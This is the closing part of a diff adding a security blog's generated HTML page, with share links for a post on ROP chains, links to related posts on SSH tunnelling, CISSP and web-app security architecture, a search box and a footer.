+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcyber-rosh.github.io%2Fmusings%2Fbuffer%2520overflow%2Frop%2520chain%2Frop-chains%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fcyber-rosh.github.io%2Fmusings%2Fbuffer%2520overflow%2Frop%2520chain%2Frop-chains%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/musings/ssh-tunnel/" class="pagination--pager" title="Understanding SSH Tunnelling and Proxychains
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/musings/ssh-tunnel/" rel="permalink">Understanding SSH Tunnelling and Proxychains
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-06-07T00:00:00+05:30">June 7, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) eve...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/musings/luke-1/" rel="permalink">Conversations with Luke Ahmed in path towards CISSP
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-06-05T00:00:00+05:30">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This article was originally published on LinkedIn
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/musings/web%20architecture/web-apps/" rel="permalink">Ideas on Scaling up Security Architecture for Deploying Web Apps
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-05-22T00:00:00+05:30">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Let us take a case of a mid sized company which wants to scale up its security architecture for it’s client facing website. As per the terms of reference, th...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+          <li><a href="https://github.com/cyber-rosh/musings" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<!-- start custom footer snippets -->
+<!-- <div class="page__footer-copyright">&copy; 2021 The Rosh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div> -->
+<div class="page__footer-copyright">&copy; 2021 The Rosh</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/musings/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/musings/assets/js/lunr/lunr.min.js"></script>
+<script src="/musings/assets/js/lunr/lunr-store.js"></script>
+<script src="/musings/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
